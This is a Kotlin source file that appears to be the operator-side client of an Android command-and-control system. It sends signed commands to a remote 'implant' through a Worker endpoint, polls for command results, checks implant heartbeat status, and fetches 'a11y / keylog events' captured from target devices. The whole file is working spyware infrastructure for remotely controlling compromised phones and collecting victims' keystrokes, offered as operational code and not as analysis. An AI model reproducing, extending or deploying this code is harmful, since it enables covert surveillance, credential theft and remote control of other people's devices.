package com.shadow.operator.data

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.net.URL
import javax.net.ssl.HttpsURLConnection

/** Implant liveness snapshot, parsed defensively from the DO's get_status reply. */
data class TargetStatus(
    val connected: Boolean,
    val lastHeartbeatMs: Long,
    val pendingCommands: Int,
    val queuedResults: Int,
    val raw: JsonObject?,
) {
    fun ageMs(now: Long): Long = if (lastHeartbeatMs > 0) now - lastHeartbeatMs else -1L

    companion object {
        val EMPTY = TargetStatus(false, 0L, 0, 0, null)
    }
}

/** One a11y / keylog event streamed by the implant. */
data class ImplantEvent(
    val ts: Long,
    val tag: String,
    val data: String,
) {
    companion object {
        fun from(o: JsonObject): ImplantEvent = ImplantEvent(
            ts = o.num("ts") ?: 0L,
            tag = o.str("tag") ?: o.str("type") ?: "evt",
            data = o.str("data") ?: o.str("text") ?: o.toString(),
        )
    }
}

/**
 * JSON helpers. Gson hands back Double for every JSON number, so `as? Long`
 * silently yields null — that is how lastHeartbeat ended up permanently 0.
 * Always go through Number.
 */
private fun JsonObject.num(key: String): Long? =
    get(key)?.takeIf { !it.isJsonNull }?.asNumber?.toLong()

private fun JsonObject.str(key: String): String? =
    get(key)?.takeIf { !it.isJsonNull && it.isJsonPrimitive }?.asString

/**
 * HTTP RPC client — sends signed commands to the Worker, polls for results.
 * No WebSocket. Every call is a fresh HTTPS POST.
 */
class RpcClient(private val config: ClientConfig) {
    private val gson = Gson()

    /**
     * Active target id. Defaults to the compiled-in config value but can be
     * switched at runtime when the operator picks a different implant from the
     * target list. Reads go through [targetId].
     */
    @Volatile
    var targetId: String = config.implantId

    private val activeTarget: String
        get() = targetId.ifBlank { config.implantId }

    companion object {
        const val TAG = "RpcClient"
        const val TIMEOUT_MS = 15000
        const val RESULT_POLL_MS = 400L
    }

    /** Canonical worker base, derived from whichever URL form the config holds. */
    private val base: String = config.workerUrl
        .replace("wss://", "https://")
        .replace("/t/wss/", "/")
        .trimEnd('/')

    /**
     * Send an RPC to the Worker (auto-signs with Ed25519).
     * Returns null on transport failure or signature refusal.
     */
    suspend fun rpcRaw(command: String, payloadJson: String = "{}"): JsonObject? =
        withContext(Dispatchers.IO) {
            try {
                // Build with Gson so implantId / command / payload are escaped properly.
                val env = JsonObject().apply {
                    addProperty("implantId", activeTarget)
                    addProperty("command", command)
                    add("payload", JsonParser.parseString(payloadJson))
                }
                val body = gson.toJson(env)

                val timestamp = (System.currentTimeMillis() / 1000).toString()
                val signature = Ed25519Signer.signRpc(config.operatorPrivKey, timestamp, body)
                    ?: run {
                        Log.e(TAG, "signing failed — check OPERATOR_PRIV_KEY format")
                        return@withContext null
                    }

                val conn = (URL("$base/api/rpc").openConnection() as HttpsURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = TIMEOUT_MS
                    readTimeout = TIMEOUT_MS
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("X-Signature", signature)
                    setRequestProperty("X-Timestamp", timestamp)
                }

                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }

                val code = conn.responseCode
                val response = if (code in 200..299) {
                    conn.inputStream.bufferedReader().use { it.readText() }
                } else {
                    conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
                }
                conn.disconnect()

                if (code !in 200..299) {
                    Log.w(TAG, "RPC $command -> $code: ${response.take(300)}")
                } else {
                    Log.d(TAG, "RPC $command -> $code: ${response.take(300)}")
                }
                JsonParser.parseString(response).takeIf { it.isJsonObject }?.asJsonObject
            } catch (e: Exception) {
                Log.e(TAG, "RPC $command failed: ${e.message}")
                null
            }
        }

    /**
     * Execute a command on the implant and wait for the result.
     * Returns a Result so callers can distinguish transport failure from
     * "implant offline" from "timed out" instead of parsing error strings.
     */
    suspend fun executeDetailed(
        implantCommand: String,
        payloadJson: String = "{}",
        timeoutMs: Long = 12000,
    ): CommandOutcome = withContext(Dispatchers.IO) {
        val send = rpcRaw(
            "send_command",
            gson.toJson(JsonObject().apply {
                addProperty("command", implantCommand)
                add("payload", JsonParser.parseString(payloadJson))
            })
        ) ?: return@withContext CommandOutcome.TransportError("RPC request failed (check key / worker URL)")

        val cmdId = send.str("cmdId")
            ?: return@withContext CommandOutcome.TransportError("no cmdId in reply")

        if (send.get("sent")?.asBoolean != true) {
            return@withContext CommandOutcome.Queued(cmdId)
        }

        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            delay(RESULT_POLL_MS)
            val resp = rpcRaw("get_result", """{"cmdId":"$cmdId"}""") ?: continue
            val wrapper = resp.getAsJsonObject("result") ?: continue
            when (wrapper.str("status")) {
                "completed" -> {
                    val data = wrapper.get("data")
                    val text = when {
                        data == null || data.isJsonNull -> "OK (no output)"
                        data.isJsonPrimitive -> data.asString
                        else -> gson.toJson(data)
                    }
                    return@withContext CommandOutcome.Ok(text)
                }
                "error" -> return@withContext CommandOutcome.Failed(
                    wrapper.str("error") ?: wrapper.str("data") ?: "implant reported error"
                )
            }
        }
        CommandOutcome.Timeout(cmdId, timeoutMs)
    }

    /** Back-compat shim for existing callers. */
    suspend fun execute(implantCommand: String, payload: String, timeoutMs: Long = 12000): String =
        executeDetailed(implantCommand, payload, timeoutMs).display()

    /** Implant liveness + queue depth. */
    suspend fun getStatus(): TargetStatus = withContext(Dispatchers.IO) {
        val resp = rpcRaw("get_status") ?: return@withContext TargetStatus.EMPTY
        val s = resp.getAsJsonObject("status") ?: return@withContext TargetStatus.EMPTY
        TargetStatus(
            connected = s.get("connected")?.asBoolean ?: false,
            lastHeartbeatMs = s.num("lastHeartbeat") ?: 0L,
            pendingCommands = (s.num("pendingCommands") ?: 0L).toInt(),
            queuedResults = (s.num("queuedResults") ?: 0L).toInt(),
            raw = s,
        )
    }

    /** Recent a11y / keylog events streamed by the implant. */
    suspend fun getEvents(): List<ImplantEvent> = withContext(Dispatchers.IO) {
        val resp = rpcRaw("get_events") ?: return@withContext emptyList()
        val arr = resp.getAsJsonArray("events") ?: return@withContext emptyList()
        arr.mapNotNull { el ->
            (el as? JsonObject)?.let { ImplantEvent.from(it) }
        }
    }
}

/** Outcome of an implant command. */
sealed class CommandOutcome {
    data class Ok(val output: String) : CommandOutcome()
    data class Failed(val error: String) : CommandOutcome()
    data class Queued(val cmdId: String) : CommandOutcome()
    data class Timeout(val cmdId: String, val waitedMs: Long) : CommandOutcome()
    data class TransportError(val why: String) : CommandOutcome()

    fun display(): String = when (this) {
        is Ok -> output
        is Failed -> "ERROR: $error"
        is Queued -> "QUEUED: implant offline, command $cmdId will run on reconnect"
        is Timeout -> "TIMEOUT: no reply in ${waitedMs}ms (cmd $cmdId)"
        is TransportError -> "ERROR: $why"
    }
}